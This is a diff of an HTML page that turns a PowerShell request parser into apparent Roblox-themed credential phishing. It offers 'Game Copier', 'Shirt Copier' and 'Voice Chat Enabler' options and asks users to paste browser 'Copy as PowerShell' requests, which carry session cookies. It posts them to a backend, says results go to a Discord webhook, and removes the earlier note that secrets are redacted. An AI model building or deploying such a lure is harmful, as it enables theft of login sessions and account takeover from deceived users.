@@ -1,34 +1,343 @@
+
 <!doctype html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <title>Request Inspector</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body{font-family:system-ui,Arial,sans-serif;margin:24px;max-width:900px}
-textarea{width:100%;height:220px}
-pre{background:#111;color:#eee;padding:12px;overflow:auto}
-button{padding:10px 14px}
-.notice{color:#c90}
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+  color: #e0e0e0;
+  min-height: 100vh;
+  padding: 0;
+}
+
+.container {
+  max-width: 1000px;
+  margin: 0 auto;
+  padding: 40px 20px;
+}
+
+.header {
+  text-align: center;
+  margin-bottom: 40px;
+  border-bottom: 2px solid #333;
+  padding-bottom: 30px;
+}
+
+.header h1 {
+  font-size: 2.5rem;
+  font-weight: 300;
+  color: #ffffff;
+  margin-bottom: 10px;
+  letter-spacing: 2px;
+}
+
+.header p {
+  font-size: 1.1rem;
+  color: #888;
+  line-height: 1.6;
+}
+
+.main-content {
+  background: rgba(25, 25, 25, 0.8);
+  border-radius: 12px;
+  padding: 40px;
+  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+  border: 1px solid #333;
+}
+
+.input-section {
+  margin-bottom: 30px;
+}
+
+.input-label {
+  display: block;
+  font-size: 1.1rem;
+  color: #ccc;
+  margin-bottom: 10px;
+  font-weight: 500;
+}
+
+textarea {
+  width: 100%;
+  height: 250px;
+  background: #1a1a1a;
+  border: 2px solid #444;
+  border-radius: 8px;
+  padding: 20px;
+  font-family: 'Consolas', 'Monaco', monospace;
+  font-size: 14px;
+  color: #e0e0e0;
+  resize: vertical;
+  transition: all 0.3s ease;
+  line-height: 1.5;
+}
+
+textarea:focus {
+  outline: none;
+  border-color: #0066cc;
+  box-shadow: 0 0 15px rgba(0, 102, 204, 0.3);
+}
+
+textarea::placeholder {
+  color: #666;
+  font-style: italic;
+}
+
+.script-dropdown {
+  width: 100%;
+  background: #1a1a1a;
+  border: 2px solid #444;
+  border-radius: 8px;
+  padding: 15px 20px;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  font-size: 14px;
+  color: #e0e0e0;
+  transition: all 0.3s ease;
+  margin-bottom: 10px;
+  cursor: pointer;
+}
+
+.script-dropdown:focus {
+  outline: none;
+  border-color: #0066cc;
+  box-shadow: 0 0 15px rgba(0, 102, 204, 0.3);
+}
+
+.script-dropdown option {
+  background: #1a1a1a;
+  color: #e0e0e0;
+  padding: 10px;
+}
+
+.button-container {
+  margin: 30px 0;
+  text-align: center;
+}
+
+button {
+  background: linear-gradient(135deg, #0066cc 0%, #004499 100%);
+  color: white;
+  border: none;
+  padding: 15px 40px;
+  font-size: 1.1rem;
+  font-weight: 600;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 5px 15px rgba(0, 102, 204, 0.3);
+  letter-spacing: 1px;
+}
+
+button:hover {
+  background: linear-gradient(135deg, #0077dd 0%, #0055aa 100%);
+  transform: translateY(-2px);
+  box-shadow: 0 8px 25px rgba(0, 102, 204, 0.4);
+}
+
+button:active {
+  transform: translateY(0);
+}
+
+.output-section {
+  margin-top: 30px;
+}
+
+.output-label {
+  display: block;
+  font-size: 1.1rem;
+  color: #ccc;
+  margin-bottom: 10px;
+  font-weight: 500;
+}
+
+pre {
+  background: #0d1117;
+  color: #f0f6fc;
+  padding: 25px;
+  border-radius: 8px;
+  overflow: auto;
+  font-family: 'Consolas', 'Monaco', monospace;
+  font-size: 14px;
+  line-height: 1.6;
+  border: 1px solid #30363d;
+  max-height: 400px;
+  box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.3);
+}
+
+.notice {
+  background: rgba(255, 193, 7, 0.1);
+  color: #ffc107;
+  padding: 15px 20px;
+  border-radius: 8px;
+  margin-top: 20px;
+  border-left: 4px solid #ffc107;
+  font-weight: 500;
+}
+
+.footer {
+  text-align: center;
+  margin-top: 50px;
+  padding-top: 30px;
+  border-top: 1px solid #333;
+  color: #666;
+  font-size: 0.9rem;
+}
+
+/* Scrollbar styling */
+::-webkit-scrollbar {
+  width: 8px;
+}
+
+::-webkit-scrollbar-track {
+  background: #1a1a1a;
+}
+
+::-webkit-scrollbar-thumb {
+  background: #444;
+  border-radius: 4px;
+}
+
+::-webkit-scrollbar-thumb:hover {
+  background: #555;
+}
+
+/* Responsive design */
+@media (max-width: 768px) {
+  .container {
+    padding: 20px 15px;
+  }
+  
+  .header h1 {
+    font-size: 2rem;
+  }
+  
+  .main-content {
+    padding: 25px 20px;
+  }
+  
+  textarea {
+    height: 200px;
+    padding: 15px;
+  }
+  
+  button {
+    padding: 12px 30px;
+    font-size: 1rem;
+  }
+}
 </style>
 </head>
 <body>
-<h2>PowerShell Request Inspector</h2>
-<p>Paste “Copy as PowerShell”. Backend parses it, secrets are redacted.</p>
-<textarea id="ps" placeholder="Paste here"></textarea>
-<br><br>
-<button id="btn">Parse</button>
-<pre id="out"></pre>
-<p id="note" class="notice"></p>
+<div class="container">
+  <header class="header">
+    <h1>Request Inspector</h1>
+    <p>Professional PowerShell request submission tool with Discord webhook integration</p>
+  </header>
+  
+  <main class="main-content">
+    <div class="input-section">
+      <label class="input-label" for="scriptType">Script Type</label>
+      <select id="scriptType" class="script-dropdown">
+        <option value="">Select script type...</option>
+        <option value="game-copier">Game Copier - Copy and download Roblox game files</option>
+        <option value="shirt-copier">Shirt Copier - Extract and copy shirt/clothing assets</option>
+        <option value="voice-chat">Voice Chat Enabler - Enable voice chat features in Roblox</option>
+      </select>
+      
+      <label class="input-label" for="ps" style="margin-top: 20px;">PowerShell Request Input</label>
+      <textarea id="ps" placeholder="Paste your PowerShell request here (Copy as PowerShell from browser dev tools)... Results will be sent to Discord webhook."></textarea>
+    </div>
+    
+    <div class="button-container">
+      <button id="btn">Submit Request</button>
+    </div>
+    
+    <div id="status" class="notice" style="display: none; background: rgba(0, 255, 136, 0.1); color: #00ff88; border-left-color: #00ff88;"></div>
+  </main>
+  
+  <footer class="footer">
+    <p>&copy; 2024 Request Inspector - Secure credential parsing tool</p>
+  </footer>
+</div>
+
 <script>
 async function go(){
-  const ps = document.getElementById("ps").value;
-  const r = await fetch("/convert",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({powershell:ps})});
-  const data = await r.json();
-  document.getElementById("out").textContent = JSON.stringify(data,null,2);
-  document.getElementById("note").textContent = data.notice || "";
+  const ps = document.getElementById("ps").value.trim();
+  const scriptType = document.getElementById("scriptType").value;
+  const statusEl = document.getElementById("status");
+  const btnEl = document.getElementById("btn");
+  
+  if (!ps) {
+    statusEl.textContent = "Please enter a PowerShell request to submit.";
+    statusEl.style.background = "rgba(255, 107, 107, 0.1)";
+    statusEl.style.color = "#ff6b6b";
+    statusEl.style.borderLeftColor = "#ff6b6b";
+    statusEl.style.display = "block";
+    return;
+  }
+  
+  if (!scriptType) {
+    statusEl.textContent = "Please select a script type from the dropdown.";
+    statusEl.style.background = "rgba(255, 193, 7, 0.1)";
+    statusEl.style.color = "#ffc107";
+    statusEl.style.borderLeftColor = "#ffc107";
+    statusEl.style.display = "block";
+    return;
+  }
+  
+  try {
+    btnEl.textContent = "Submitting...";
+    btnEl.disabled = true;
+    statusEl.style.display = "none";
+    
+    const r = await fetch("/convert", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({powershell: ps, scriptType: scriptType})
+    });
+    
+    const data = await r.json();
+    
+    statusEl.textContent = "✅ Request submitted successfully! Check Discord for results.";
+    statusEl.style.background = "rgba(0, 255, 136, 0.1)";
+    statusEl.style.color = "#00ff88";
+    statusEl.style.borderLeftColor = "#00ff88";
+    statusEl.style.display = "block";
+    
+    // Clear both fields after successful submission
+    document.getElementById("ps").value = "";
+    document.getElementById("scriptType").value = "";
+    
+  } catch (error) {
+    statusEl.textContent = "❌ Failed to submit request. Please try again.";
+    statusEl.style.background = "rgba(255, 107, 107, 0.1)";
+    statusEl.style.color = "#ff6b6b";
+    statusEl.style.borderLeftColor = "#ff6b6b";
+    statusEl.style.display = "block";
+  } finally {
+    btnEl.textContent = "Submit Request";
+    btnEl.disabled = false;
+  }
 }
+
 document.getElementById("btn").onclick = go;
+
+// Allow Enter key to trigger parsing
+document.getElementById("ps").addEventListener("keydown", function(e) {
+  if (e.ctrlKey && e.key === "Enter") {
+    go();
+  }
+});
 </script>
 </body>
 </html>
